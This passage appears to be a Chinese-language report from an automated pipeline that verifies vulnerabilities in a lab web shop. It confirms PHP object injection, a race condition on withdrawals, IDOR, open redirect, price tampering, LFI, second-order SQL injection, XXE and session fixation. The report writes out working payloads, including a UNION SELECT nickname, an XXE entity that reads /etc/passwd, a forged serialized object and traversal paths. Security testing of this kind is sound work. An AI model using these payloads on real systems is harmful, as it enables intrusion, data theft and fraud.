  - 作业：`ef280c26553d4455bb9d1c9a0b8eb106` script finished exit=0；`59f76c140c544bbea5458e9af666ea82` script finished exit=0
  - 适配脚本：`9f82013c-adapted-poc.php`（见证据包 evidence/）
  - 备注：作业 ef280c26553d4455bb9d1c9a0b8eb106（identity=alice，exit_code=0，evidence_usable=true）stdout 同时给出正常与攻击两侧原文：EXPORT0/EXPORT1 为应用自身导出的 O:12:"MemberBackup":2:{tier standard, displayName 林晓}；ATTACK_PAYLOAD_B64 为手工构造的序列化串；EXPORT2 显示 gold/PWNED_e4c0。攻击 payload 与页面自带的合法导出不同，且 tier 未在表单中可编辑，证明属性来自用户可控反序列化数据。源码 backup.php:4-5（base64_decode strict → unserialize 未传 allowed_classes → instanceof 在反序列化之后）与 backup.php:6（UPDATE tier,display_name）一致；src/backup.php:2-5 定义 public $tier/$displayName。另：作业 59f76c140c544bbea5458e9af666ea82 曾因提取串尾部混入 '</textarea' 触发 base64_decode strict 400，属测试脚本提取问题，不作为防护证据。共享库中 alice …

- 正式复核 `cbe38900c859456d8eeda6696c813116`：复核确认；引用 revision 1 / verification `9f82013c84b34113815d19b0df3c6c99`
  - 理由：完整读取两侧观测：正常侧用应用自生成备份恢复后再次导出与原始一致（tier standard、displayName 林晓）；攻击侧提交伪造序列化串返回 200 并落库，重新导出为 tier=gold、displayName=PWNED_e4c0，宿主记录 tier standard→gold，对应 backup.php:4-6 直接 unserialize 后写库，确认对象注入与权益篡改。
  - 复核观测：正常侧 正常侧：从 /account/backup.php 取得应用自己生成的导出 EXPORT0 = O:12:"MemberBackup":2:{s:4:"tier";s:8:"standard";s:11:"displayName";s:6:"林晓";}，带真实 csrf 提交恢复，返回 RESTORE_NORMAL 200 且页面含“会员备份已恢复”；再次读取导出 EXPORT1 与 EXPORT0 完全相同（tier 仍 standard、displayName 仍林晓），即合法备份恢复不改变状态。；攻击侧 攻击侧提交伪造的序列化对象（base64: TzoxMjoiTWVtYmVyQmFja3VwIjoyOntzOjQ6InRpZXIiO3M6NDoiZ29sZCI7...）即 O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:10:"PWNED_e4c0";}。服务端返回 RESTORE_ATTACK 200 且含“会员备份已恢复”；随后重新 GET 备份页并解析导出，得到 EXPORT2 O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:10:"PWNED_e4c0";}，说明攻击者指定的属性已被 unserialize 并写入 users（宿主 postcondition 记录 tier standard→gold）。

### C-07 提现先读后写无锁，競态可重复扣减同一余额实现超额提现

- verification `744d525c729f48a1ae477f75774c6237`（finding `168e43edeee643d6a8d80cfc004090ba` revision 1，context `b7f4ab9902114099a0cc3e76b2e36938`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧（并发前状态）：读取当前用户 JSON 为 role=customer、balance="100.00"；单笔 amount=80 满足源码第5行的余额检查（80 ≤ 100），在无并发的正确实现下只应成功一次并留下余额 20.00。
  - 攻击侧观测：攻击侧在同一会话、同一 csrf token 下用线程屏障并发发出 3 个 POST /wallet/withdraw.php（amount=80）。三笔全部返回 200 且 JSON 均为 {"status":"paid","amount":80,"balance":20}，回执 id 分别为 3、1、2（互不相同）；随后读取当前用户，balance 为 "20.00"。初始余额仅 100.00，实际支付 3×80=240，余额却只按一次 100-80 扣减，超额提现 140，验证了先读后写丢失更新。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`0279145db24e485e9e1cceff151371c5`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`0279145db24e485e9e1cceff151371c5` script finished exit=0
  - 适配脚本：`744d525c-adapted-poc.php`（见证据包 evidence/）
  - 备注：作业 0279145db24e485e9e1cceff151371c5（identity=alice，exit_code=0，evidence_usable=true）stdout 同时给出两侧原文：START_ME balance 100.00；三条 CONC 响应均为 paid、balance=20、回执 1/2/3；END_ME balance 20.00，宿主 state_changes 记录 100.00→20.00。源码 withdraw.php:3 session_write_close 释放会话锁使并发可行；:4 读 balance、:5 仅比较、:6 usleep(350000) 放大窗口、:7 UPDATE users SET balance=$balance-$amount WHERE id=? 无 balance 条件/行锁、:8 各自插入 withdrawals。每笔 amount=80 单独均 ≤100 故各自通过检查；最终余额等于单次扣减说明三个 UPDATE 使用同一预读值覆盖写入。未使用特权身份，postcondition 仍为 alice/customer。

- 正式复核 `956ddb9b29b14db7993c8fb6e2ac510d`：复核确认；引用 revision 1 / verification `744d525c729f48a1ae477f75774c6237`
  - 理由：完整读取两侧观测：正常侧初始 balance=100.00、role=customer，单笔 amount=80 满足第5行余额检查；攻击侧在同会话同 csrf 下用线程屏障并发 3 笔各 80，全部 200 返回 paid、回执 3/1/2 互不相同，最终余额仅 20.00（实际支付 240、超额 140），与第4/5/6/7/8行先读后写无锁实现一致，确认丢失更新竞态。
  - 复核观测：正常侧 正常侧（并发前状态）：读取当前用户 JSON 为 role=customer、balance="100.00"；单笔 amount=80 满足源码第5行的余额检查（80 ≤ 100），在无并发的正确实现下只应成功一次并留下余额 20.00。；攻击侧 攻击侧在同一会话、同一 csrf token 下用线程屏障并发发出 3 个 POST /wallet/withdraw.php（amount=80）。三笔全部返回 200 且 JSON 均为 {"status":"paid","amount":80,"balance":20}，回执 id 分别为 3、1、2（互不相同）；随后读取当前用户，balance 为 "20.00"。初始余额仅 100.00，实际支付 3×80=240，余额却只按一次 100-80 扣减，超额提现 140，验证了先读后写丢失更新。

### C-08 orders/detail.php 仅按订单 id 查询、无用户归属校验，任意登录用户可读他人订单

- verification `fd65cc79adbc45689c06b934124d451f`（finding `6f9baa7bb5694f4e8d2f1635f38c7d9f` revision 1，context `af8c6d486f0c4bbb8a2a6a75106ca48c`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：alice 登录后 /orders/index.php 200，页面仅生成一个详情链接 detail.php?id=1；请求自己的 /orders/detail.php?id=1 返回 200（JSON 含 user_id=1、username=alice、order_no SG-1001、total 129.00），不存在的 id=3..8 返回 404 {"error":"订单不存在。"}，说明按 id 查询本身可用且越界的“不存在”分支正常。
  - 攻击侧观测：攻击侧：同一 alice 会话（其订单中心仅列出 detail.php?id=1，即本人唯一订单）请求 /orders/detail.php?id=2 并带 Accept: application/json，返回 200，正文为 {"id":2,"order_no":"SG-1002",...,"user_id":2,"username":"bob",...,"total":"158.00","private_note":"BOB_PRIVATE_ORDER_gift_for_family"}，即 alice（user_id=1）成功读取了 bob 的订单号、金额与私密配送备注，且未被 403/404 拦截。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`a813ea3456e3447ba10f0623d91690d4`；`6b98d1b677a44efabc260adb413a24dd`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`6b98d1b677a44efabc260adb413a24dd` script finished exit=0；`a813ea3456e3447ba10f0623d91690d4` script finished exit=0
  - 适配脚本：`fd65cc79-adapted-idor_order_detail.py`（见证据包 evidence/）
  - 备注：作业 6b98d1b677a44efabc260adb413a24dd（identity=alice，exit_code=0，evidence_usable=true）输出：MEMBER_SESSION 200、OWN_DETAIL_LINKS ['1']（/orders/index.php 只给出本人的 id=1）；ID 1 200 user_id 1 alice；ID 2 200 user_id 2 username bob order_no SG-1002 total 158.00 private_note BOB_PRIVATE_ORDER_gift_for_family；ID 3-8 均 404 订单不存在。宿主预执行 POC（job a813ea3456e3447ba10f0623d91690d4）中所谓 attack 实际也是 id=1（alice 自己的订单），不构成跨用户对照，仅作正常侧佐证（control 200 与完整 JSON 字段）。源码 detail.php:2 的 SQL 为 WHERE o.id=? 仅绑定 $_GET['id']，无 user_id 约束；index.php:2 则 WHERE user_id=? 绑定当前用户，证明详情页缺失归属条件；:3 在 Accept 含 application/json 时 json_response 全量…

- 正式复核 `8f21fbc2087241f282cb671cda9f118b`：复核确认；引用 revision 1 / verification `fd65cc79adbc45689c06b934124d451f`
  - 理由：完整读取两侧观测：正常侧 alice 订单中心仅列出 detail.php?id=1，请求自身 id=1 返回 200 且 user_id=1，id=3..8 返回 404；攻击侧同一 alice 会话带 Accept: application/json 请求 id=2 返回 200，正文含 user_id=2、username=bob、SG-1002、158.00 与 private_note，与第2行仅绑定 $_GET['id'] 的查询一致，确认越权读取他人订单。
  - 复核观测：正常侧 正常侧：alice 登录后 /orders/index.php 200，页面仅生成一个详情链接 detail.php?id=1；请求自己的 /orders/detail.php?id=1 返回 200（JSON 含 user_id=1、username=alice、order_no SG-1001、total 129.00），不存在的 id=3..8 返回 404 {"error":"订单不存在。"}，说明按 id 查询本身可用且越界的“不存在”分支正常。；攻击侧 攻击侧：同一 alice 会话（其订单中心仅列出 detail.php?id=1，即本人唯一订单）请求 /orders/detail.php?id=2 并带 Accept: application/json，返回 200，正文为 {"id":2,"order_no":"SG-1002",...,"user_id":2,"username":"bob",...,"total":"158.00","private_note":"BOB_PRIVATE_ORDER_gift_for_family"}，即 alice（user_id=1）成功读取了 bob 的订单号、金额与私密配送备注，且未被 403/404 拦截。

### C-09 auth/continue.php 的 next 参数未校验即写入 Location 头，导致开放重定向

- verification `e4de227ef7384be4b810a326c0a3118a`（finding `d5eedb8664a24e029b3279ca593c5f5b` revision 1，context `4fdcf363f6d44c18be8eff29a7ad70dd`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：已登录 alice（MEMBER_SESSION 200）访问 /auth/continue.php?next=/orders/index.php 返回 302、Location 为 '/orders/index.php'、响应体为空，即站内相对路径被正常用作跳转目标；同一会话流程中未登录访客访问带外部 next 的同一入口返回 401（bootstrap.php:34 require_user 的未登录分支），确认该功能要求登录。
  - 攻击侧观测：同一已登录 alice 会话访问 /auth/continue.php?next=https://evil.example/phish?next=1（next 参数 URL 编码后传入），返回 302，Location 头为 'https://evil.example/phish?next=1'，响应体为空：服务端将未校验的外部地址原样写入 Location，浏览器会跳转至攻击者站点。作为前置对照，未登录访客访问同一 URL 返回 401（Location 为 None），说明该路径确实先要求登录，登录用户才会触发外跳。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`cbd6b71762ae446684b50e2b7b6abfa4`；`ea20b6401ded4fc198de9dda7441d4f0`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`ea20b6401ded4fc198de9dda7441d4f0` script finished exit=0
  - 适配脚本：`e4de227e-adapted-poc.php`（见证据包 evidence/）
  - 备注：作业 ea20b6401ded4fc198de9dda7441d4f0（identity=alice，exit_code=0，evidence_usable=true）一次运行内给出三组观测：MEMBER_SESSION 200 确认会话生效；NORMAL_INTERNAL 302 Location '/orders/index.php'；ATTACK_EXTERNAL 302 Location 'https://evil.example/phish?next=1'；GUEST_NO_SESSION 401。前一作业 cbd6b71762ae446684b50e2b7b6abfa4 因登录 POST 被 NoRedirect 处理器抛 302 而未进入观测阶段，exit_code=1、evidence_usable=false，仅说明脚本构造问题，不作为证据。源码 continue.php:3 在 require_user() 后直接将 (string)$_GET['next'] 拼入 header('Location: ...')，无同源/白名单校验；bootstrap.php:34 的 require_user 在未登录时 fail_request(401)。

- 正式复核 `f6119114edd047f0b398782f4aba6278`：复核确认；引用 revision 1 / verification `e4de227ef7384be4b810a326c0a3118a`
  - 理由：完整读取两侧观测：正常侧已登录 alice 以站内 next=/orders/index.php 得到 302 Location '/orders/index.php'，未登录访客为 401；攻击侧同会话以 next=https://evil.example/phish?next=1 得到 302 Location 为同一外部 URL、响应体为空，与第3行无条件写入 Location 的实现一致，确认开放重定向。
  - 复核观测：正常侧 已登录 alice（MEMBER_SESSION 200）访问 /auth/continue.php?next=/orders/index.php 返回 302、Location 为 '/orders/index.php'、响应体为空，即站内相对路径被正常用作跳转目标；同一会话流程中未登录访客访问带外部 next 的同一入口返回 401（bootstrap.php:34 require_user 的未登录分支），确认该功能要求登录。；攻击侧 同一已登录 alice 会话访问 /auth/continue.php?next=https://evil.example/phish?next=1（next 参数 URL 编码后传入），返回 302，Location 头为 'https://evil.example/phish?next=1'，响应体为空：服务端将未校验的外部地址原样写入 Location，浏览器会跳转至攻击者站点。作为前置对照，未登录访客访问同一 URL 返回 401（Location 为 None），说明该路径确实先要求登录，登录用户才会触发外跳。

### C-10 订单创建信任客户端提交的 price，可任意低价下单

- verification `a3d460088f1742eab5d3c91533f0cee4`（finding `7c8e155d6b5741d7be73c3dab2bc6a10` revision 1，context `4f02dc7eae0c45f5a286546843a1c9b1`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：商品页 /catalog/detail.php?id=1 显示晨光手冲壶价格 ¥129.00；以该价格提交 product_id=1、quantity=1、price=129.00，POST /orders/create.php 返回 200 并跳转订单 id=3，订单详情显示“商品 晨光手冲壶 / 购买人 alice / 数量 1 / 实付金额 ¥129.00”，与目录价一致。
  - 攻击侧观测：攻击侧对同一商品提交 product_id=1、quantity=1、price=0（csrf 真实）：POST /orders/create.php 返回 200 并跳转订单 id=4，订单详情显示“商品 晨光手冲壶 / 购买人 alice / 数量 1 / 实付金额 ¥0.00”，订单号 SG-d25bc79805。服务端接受了客户端价格并生成 0 元订单。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`d1c8c8ddde11463ca564b9573d4d9334`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`d1c8c8ddde11463ca564b9573d4d9334` script finished exit=0
  - 适配脚本：`a3d46008-adapted-poc.php`（见证据包 evidence/）
  - 备注：作业 d1c8c8ddde11463ca564b9573d4d9334（identity=alice，exit_code=0，evidence_usable=true）stdout 同时包含两侧原文：商品页 PRICE_FROM_PAGE 129.00 且 CAT_SNIPPET 显示“¥129.00 库存 50 件”；正常订单 id=3 详情“实付金额 ¥129.00”；攻击订单 id=4 详情“实付金额 ¥0.00”。源码 create.php:3 从 $_POST['price'] 取价，:4 仅校验 price===false/负值，:5 total=round(price*quantity)，:7 INSERT orders(unit_price,total) 使用客户端价；商品表 $p 价格从未参与计算。价格 0 未被拒绝，正常/攻击差异直接对应源码。postcondition 仍为 alice/customer，未使用特权身份；两笔订单已写入共享库（id=3、4）。

- 正式复核 `14d86a13ee054ba981fc8f5ae738b880`：复核确认；引用 revision 1 / verification `a3d460088f1742eab5d3c91533f0cee4`
  - 理由：两侧观测均完整读取：正常侧以目录价 129.00 提交生成订单 id=3，实付 ¥129.00；攻击侧同商品 product_id=1、quantity=1、price=0 提交成功并生成订单 id=4，实付 ¥0.00，服务端未重算价格。观测行为与 create.php:3-7 源码逐行一致，确认价格篡改。
  - 复核观测：正常侧 正常侧：商品页 /catalog/detail.php?id=1 显示晨光手冲壶价格 ¥129.00；以该价格提交 product_id=1、quantity=1、price=129.00，POST /orders/create.php 返回 200 并跳转订单 id=3，订单详情显示“商品 晨光手冲壶 / 购买人 alice / 数量 1 / 实付金额 ¥129.00”，与目录价一致。；攻击侧 攻击侧对同一商品提交 product_id=1、quantity=1、price=0（csrf 真实）：POST /orders/create.php 返回 200 并跳转订单 id=4，订单详情显示“商品 晨光手冲壶 / 购买人 alice / 数量 1 / 实付金额 ¥0.00”，订单号 SG-d25bc79805。服务端接受了客户端价格并生成 0 元订单。

### C-11 content/page.php 本地文件包含：未过滤 page 参数拼接 include 路径

- verification `59ab40b5d9404e2a9edbdf32cf344c4e`（finding `5783491e92f4458082050a3863ac0095` revision 1，context `3e44e9e5856549fb86d620b52c647d1a`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：page=home 返回 200、content-length 946，正文完整（含“为日常，选一点喜欢的东西”介绍、“?page=home / ?page=shipping”链接与 footer）；不存在的视图 page=no-such-view-9f3a 返回 200、content-length 813，正文同样完整并以页脚结束，说明 include 找不到文件时只是不会输出该视图，后续页面结构仍正常渲染。
  - 攻击侧观测：攻击侧：alice 会话 GET /content/page.php?page=..%2F..%2Fsrc%2Fbootstrap 返回 200，但正文在 page-heading（“内容中心” h1）处即结束，content-length 690，缺少正常页面必有的“?page=home/配送与售后”链接区和 footer，说明 include 在输出该 section 之前发生致命中止；即路径 ../.. 已解析到 APP_ROOT/resources/views/../../src/bootstrap.php = app/src/bootstrap.php（该文件已被外层 page.php require，重复包含触发函数重复声明致命错误）。
  - 已保存作业事实：4 个；满足执行及前提检查的作业：4 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`fe21c62f4bbb4d18947ed144fd47c0cb`；`9d37ff6800624a84b9fefa4482423fbf`；`27c1ffbcc71943d78af88cf6d821af42`；`150f1d322c0d4454add275eaa986cbf3`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`27c1ffbcc71943d78af88cf6d821af42` http finished exit=0；`9d37ff6800624a84b9fefa4482423fbf` http finished exit=0；`150f1d322c0d4454add275eaa986cbf3` http finished exit=0；`fe21c62f4bbb4d18947ed144fd47c0cb` script finished exit=0
  - 适配脚本：`59ab40b5-adapted-lfi_page_poc_python.py`（见证据包 evidence/）
  - 备注：作业 27c1ffbcc71943d78af88cf6d821af42（http，alice）为攻击请求，正文 1070 字符、content-length 690，止于 h1；作业 9d37ff6800624a84b9fefa4482423fbf（http，alice）page=home 正常，content-length 946，正文完整含商城介绍、?page= 链接与 footer；作业 150f1d322c0d4454add275eaa986cbf3（http，alice）page=no-such-view-9f3a 对照，content-length 813，正文完整含链接区与 footer，说明 include 目标不存在只会产生 warning（display_errors=Off 不显示）而不会截断，因此攻击请求的截断只能归因于成功包含 app/src/bootstrap.php 后的致命错误。宿主预执行作业 fe21c62f4bbb4d18947ed144fd47c0cb 同样给出 home 1381 字节 vs ../../src/bootstrap 1052 字节且均以页头开始。本上下文 http 作业 diagnostics 均为 capability_unavailable，未取得 PHP 错误原文；根因判断基于上述对照与源码 page.php:3 的路径…

- 正式复核 `c7b36aabc01b4d5e8de894c17b31b8cc`：复核确认；引用 revision 1 / verification `59ab40b5d9404e2a9edbdf32cf344c4e`
  - 理由：两侧观测完整：正常 page=home 与不存在视图均完整渲染并含 footer；攻击 page=../../src/bootstrap 返回 200 但在 page-heading 前截断且无链接区与 footer（length 690），对照说明 ../ 已解析到 app/src/bootstrap.php 并造成致命错误，证明 include 路径可穿越 views 目录；page.php:3 无过滤与 php.ini 未设 open_basedir 支持该结论。
  - 复核观测：正常侧 正常侧：page=home 返回 200、content-length 946，正文完整（含“为日常，选一点喜欢的东西”介绍、“?page=home / ?page=shipping”链接与 footer）；不存在的视图 page=no-such-view-9f3a 返回 200、content-length 813，正文同样完整并以页脚结束，说明 include 找不到文件时只是不会输出该视图，后续页面结构仍正常渲染。；攻击侧 攻击侧：alice 会话 GET /content/page.php?page=..%2F..%2Fsrc%2Fbootstrap 返回 200，但正文在 page-heading（“内容中心” h1）处即结束，content-length 690，缺少正常页面必有的“?page=home/配送与售后”链接区和 footer，说明 include 在输出该 section 之前发生致命中止；即路径 ../.. 已解析到 APP_ROOT/resources/views/../../src/bootstrap.php = app/src/bootstrap.php（该文件已被外层 page.php require，重复包含触发函数重复声明致命错误）。

### C-12 会员报表 nickname 二次 SQL 注入（用户资料写入后未参数化拼接）

- verification `bb8cdae9a5ce4a3daeab27ead8ed01a7`（finding `5aff729ccaaa4480a9e526a947f58de9` revision 1，context `9ecf6ba4004c4e4aaa31f42bfc0ede6a`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：攻击前 operator GET /ops/report.php?user_id=1 返回 200（content-length 955），alice 昵称为正常值 alice 时 tbody 仅一行：<tr><td>alice</td><td>alice@shop.local</td><td>customer</td></tr>。说明报表按 nickname 精确匹配单条会员记录。
  - 攻击侧观测：alice 通过 GET /account/update.php 取真实 csrf 后 POST nickname=Payload，UPDATE_STATUS 200，响应 JSON nickname 原样为 `x' UNION SELECT username,email,role FROM users-- -`（STORED_NICKNAME 一致，NICKNAME_MATCH True）。随后同一 operator 身份 GET /ops/report.php?user_id=1 返回 200（content-length 996），tbody 变为四行：alice/alice@shop.local/customer、bob/bob@shop.local/customer、operator/ops@shop.local/operator、admin/admin@shop.local/admin，即 UNION SELECT 的 users 全表结果，证明存储的 nickname 被拼接执行。
  - 已保存作业事实：4 个；满足执行及前提检查的作业：3 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`7da91ba131294a0a89a2a4c7af32eb47`；`4a4b83aeb6194cfe9fe22d28c4d64f2e`；`9ab75331badf40daaa9596a9fd549dd9`；`c5104601c9304d5ab95d5bf2aab7e57c`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`4a4b83aeb6194cfe9fe22d28c4d64f2e` http finished exit=0；`9ab75331badf40daaa9596a9fd549dd9` script finished exit=0；`c5104601c9304d5ab95d5bf2aab7e57c` http finished exit=0
  - 适配脚本：`bb8cdae9-adapted-sqli_report_secondorder.py`（见证据包 evidence/）
  - 备注：正常侧引用 job 4a4b83aeb6194cfe9fe22d28c4d64f2e（operator，单行 alice）；存储侧引用 job 9ab75331badf40daaa9596a9fd549dd9（alice，csrftoken 后 POST，昵称原样入库）；攻击侧引用 job c5104601c9304d5ab95d5bf2aab7e57c（operator，四行 UNION 结果）。最初 job 7da91ba131294a0a89a2a4c7af32eb47 因缺 csrf 得 403，未作为证据。服务端诊断对该 http 作业为 capability_unavailable，故结论仅依据响应原文与源码引用，不依赖诊断。角色划分：alice 为普通 customer，仅由 operator（源码 require_user(['operator','admin'])）触发漏洞，未用特权身份冒充普通会员。

- 正式复核 `6ba649cd7f7d444e8fb37deda50a77c2`：复核确认；引用 revision 1 / verification `bb8cdae9a5ce4a3daeab27ead8ed01a7`
  - 理由：两侧观测完整对照：正常侧 operator GET /ops/report.php?user_id=1 返回 200，tbody 仅 alice/alice@shop.local/customer 一行，符合 report.php:3 按 nickname 精确匹配单条记录；攻击侧 alice 以真实 csrf POST nickname=`x' UNION SELECT username,email,role FROM users-- -`，update.php 参数化存储后 STORED_NICKNAME 与响应 JSON 完全一致，随后同一请求返回 200 且 tbody 变为 users 全表四行（含 email/role、content-length 996），与静态拼接点 report.php:3 吻合，确认存储型二次 SQL 注入。
  - 复核观测：正常侧 攻击前 operator GET /ops/report.php?user_id=1 返回 200（content-length 955），alice 昵称为正常值 alice 时 tbody 仅一行：<tr><td>alice</td><td>alice@shop.local</td><td>customer</td></tr>。说明报表按 nickname 精确匹配单条会员记录。；攻击侧 alice 通过 GET /account/update.php 取真实 csrf 后 POST nickname=Payload，UPDATE_STATUS 200，响应 JSON nickname 原样为 `x' UNION SELECT username,email,role FROM users-- -`（STORED_NICKNAME 一致，NICKNAME_MATCH True）。随后同一 operator 身份 GET /ops/report.php?user_id=1 返回 200（content-length 996），tbody 变为四行：alice/alice@shop.local/customer、bob/bob@shop.local/customer、operator/ops@shop.local/operator、admin/admin@shop.local/a…

### C-13 xml-import.php 以 LIBXML_NOENT|LIBXML_DTDLOAD 解析用户 XML 造成 XXE 文件读取

- verification `b0718b254f184a23ae8be62f7f8ccf3c`（finding `addbc91072b7478c8aa7d68521c49c73` revision 1，context `168ee07ed7b2442c8d1e9473d4429eec`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：operator 登录后 GET /ops/xml-import.php 返回 ACCESS 200，取真实 csrf 后 POST 正常 XML <config><title>test</title></config>，返回 NORMAL 200，导入结果 <pre> 输出 'test'。
  - 攻击侧观测：攻击侧提交 <?xml version="1.0"?><!DOCTYPE c [<!ENTITY e SYSTEM "file:///etc/passwd">]><config><title>&e;</title></config>：返回 200，导入结果 <pre> 中回显 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin/nologin\n...'（ROOT True、BASH True），即外部实体被展开为 /etc/passwd 内容并由 $doc->title 输出。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`40a370740aad49e28557f7b209778077`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`40a370740aad49e28557f7b209778077` script finished exit=0
  - 适配脚本：`b0718b25-adapted-xxe_xml_import.py`（见证据包 evidence/）
  - 备注：作业 40a370740aad49e28557f7b209778077（identity=operator，exit_code=0，evidence_usable=true）stdout 同时给出两侧：ACCESS 200、NORMAL PRE='test'、ATTACK PRE 为 /etc/passwd 原文片段（ROOT True、BASH True）。源码 xml-import.php:2 require_user(['operator','admin'])，:3 check_csrf 后 simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT&#124;LIBXML_DTDLOAD)，未使用 LIBXML_NONET、未拒绝 DOCTYPE，:4 h($output) 回显 $doc->title。角色门禁为源码前提，故使用 operator；未用特权身份冒充普通会员。postcondition 仍为 operator，无状态变更。

- 正式复核 `da834c58af63459abe9d4b60e3861286`：复核确认；引用 revision 1 / verification `b0718b254f184a23ae8be62f7f8ccf3c`
  - 理由：正常侧 operator 提交 <config><title>test</title></config> 得 NORMAL 200 且 <pre> 输出 test，说明解析与回显路径正常；攻击侧提交含 <!ENTITY e SYSTEM "file:///etc/passwd"> 的 DOCTYPE 文档后，同一 <pre> 回显 root:x:0:0:root:/root:/bin/bash 等完整 /etc/passwd 行，验证 LIBXML_NOENT&#124;LIBXML_DTDLOAD 导致外部实体展开并读取本地文件，与 xml-import.php:3-4 静态证据一致。
  - 复核观测：正常侧 正常侧：operator 登录后 GET /ops/xml-import.php 返回 ACCESS 200，取真实 csrf 后 POST 正常 XML <config><title>test</title></config>，返回 NORMAL 200，导入结果 <pre> 输出 'test'。；攻击侧 攻击侧提交 <?xml version="1.0"?><!DOCTYPE c [<!ENTITY e SYSTEM "file:///etc/passwd">]><config><title>&e;</title></config>：返回 200，导入结果 <pre> 中回显 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin/nologin\n...'（ROOT True、BASH True），即外部实体被展开为 /etc/passwd 内容并由 $doc->title 输出。

### C-14 auth/login.php 接受 sid 参数指定会话 ID，登录后不重建会话导致会话固定

- verification `e56f508ccc3144b88d5a0b01db1e4399`（finding `0e642f7c599c4d2a8a0e1973916b983b` revision 1，context `3c39c9cf4d7d479fbe9e29fa2d3b41aa`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：无凭据、无 cookie 的客户端 GET /orders/index.php 返回 BASELINE 401，响应为登录页（LOGINPAGE True），即未认证用户无法访问会员订单页，也说明预设 SID 在登录前不是已认证会话。
  - 攻击侧观测：攻击侧预设 SID=fixation0e642f7c599c4d2a，受害者通过 /auth/login.php?sid=... 使用 alice 凭据登录：预登录与登录 POST 的 Set-Cookie 均为 SHOPSESSID=fixation0e642f7c599c4d2a（POST 302 → /），VICTIM_JAR 仅含该值且 EQ True，说明认证后未重建会话 ID。另一个从未提交凭据的客户端仅发送 Cookie: SHOPSESSID=fixation0e642f7c599c4d2a，访问 /orders/index.php 与 /account/index.php 均返回 200（LOGOUT True、LOGINLINK False、显示“林晓”），即复用受害者的已认证会话。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`dbced3bdb5c648a1a6a859815006b1b6`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`dbced3bdb5c648a1a6a859815006b1b6` script finished exit=0
  - 适配脚本：`e56f508c-adapted-poc.php`（见证据包 evidence/）
  - 备注：当前 context 作业 dbced3bdb5c648a1a6a859815006b1b6（identity=alice，exit_code=0，evidence_usable=true）stdout 给出完整对照：BASELINE 401+登录页（未认证）；PRE/POST 的 Set-Cookie 都是预设 SID；JAR 仅该 SID 且 EQ True；ATTACK 两个会员页 200 且显示受害者。源码 login.php:3 将 $_GET['sid'] 传入 start_session，bootstrap.php:13 关闭 strict_mode、:17 session_id($sid)、:18 session_start，login.php:8-9 仅写 $_SESSION['user_id'] 后跳转，未 session_regenerate_id。攻击者侧不使用用户名/密码，仅复用预设 ID；precondition/postcondition 均为 alice/customer，未使用特权身份。共享库中 alice 会话已建立，后续实验如需干净状态由宿主复位。

- 正式复核 `d472c645074b42faae3522743ffeb4b6`：复核确认；引用 revision 1 / verification `e56f508ccc3144b88d5a0b01db1e4399`
  - 理由：读取完整两侧观测：正常侧无凭据 GET /orders/index.php 为 401 登录页，证明预设 SID 登录前未认证；攻击侧预登录与登录 POST 的 Set-Cookie 均为 SHOPSESSID=fixation0e642f7c599c4d2a（302 → /），VICTIM_JAR EQ True 表明认证后未重建会话，另一未提交凭据客户端仅凭该 SID 访问 /orders 与 /account 返回 200（LOGOUT True、LOGINLINK False、显示林晓），与 bootstrap.php:13/17-18、login.php:3/7-8 静态证据一致，确认会话固定。
  - 复核观测：正常侧 正常侧：无凭据、无 cookie 的客户端 GET /orders/index.php 返回 BASELINE 401，响应为登录页（LOGINPAGE True），即未认证用户无法访问会员订单页，也说明预设 SID 在登录前不是已认证会话。；攻击侧 攻击侧预设 SID=fixation0e642f7c599c4d2a，受害者通过 /auth/login.php?sid=... 使用 alice 凭据登录：预登录与登录 POST 的 Set-Cookie 均为 SHOPSESSID=fixation0e642f7c599c4d2a（POST 302 → /），VICTIM_JAR 仅含该值且 EQ True，说明认证后未重建会话 ID。另一个从未提交凭据的客户端仅发送 Cookie: SHOPSESSID=fixation0e642f7c599c4d2a，访问 /orders/index.php 与 /account/index.php 均返回 200（LOGOUT True、LOGINLINK False、显示“林晓”），即复用受害者的已认证会话。

